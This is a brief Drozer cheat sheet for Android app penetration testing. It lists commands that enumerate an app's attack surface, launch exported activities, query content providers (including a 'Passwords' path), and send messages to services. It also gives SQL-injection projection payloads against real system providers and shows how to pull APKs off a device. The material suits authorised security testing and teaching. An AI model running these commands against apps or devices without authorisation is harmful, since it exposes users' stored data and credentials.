## Drozer 101

### 1. Info

- Tool: `https://github.com/FSecureLABS/drozer`
- Agent: `https://github.com/FSecureLABS/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk`
- Docker: `https://github.com/haxxinen/dockero-infosec/tree/master/drozer`


### 2. Setup

a. Install the Drozer agent
```
# adb install /tmp/drozer-angent-*.apk
```
Note: run the app and toggle the "Embedded Server"

b. Connect to the agent
```
# adb devices
# adb forward tcp:31415 tcp:31415
# drozer server start
# drozer console devices
# drozer console connect
```

### 3. Enumerate attack surface of specific app

```
dz>ls
dz>run app.package.list -f myappname
dz>run app.package.info -a com.app.abc
dz>run app.package.attacksurface com.app.abc
```

### 4. Start activity

```
dz>run app.activity.info -a com.app.abc
dz>run app.activity.start --component com.app.abc com.app.abc.MainActivity
dz>run app.activity.start --component com.app.abc com.app.abc.SomeOtherActivity
```

### 5. List and query content provider (database)

```
dz>run app.provider.info -a com.app.abc
dz>run app.provider.finduri com.app.abc
dz>run app.provider.query content://com.app.abc.SomeContentProvider/Interesting
dz>run app.provider.query content://com.app.abc.SomeContentProvider/Passwords
```

#### 5.1. SQL injection in content provider (SQLite)
```
dz> run app.provider.query content://com.google.settings/partner --projection "* FROM sqlite_master-- -" --vertical
dz> run app.provider.query content://media/external/video/media --projection "* FROM sqlite_master-- -" --vertical
```

### 6. Interact with a service

```
dz>run app.service.info -a com.app.abc
dz>run app.service.send com.app.abc.name.CryptoService --msg 3265 168 --extra string com.app.abc.name.KEY thisispass --extra string com.app.abc.name.PASSWORD 9diawd9dwad==
```

### 7. Download APK for an installed app

```
dz>run app.package.info -a com.app.abc
dz>run tools.file.download /data/app/com.app.abc.name-*.apk ~/Desktop/app.apk
```
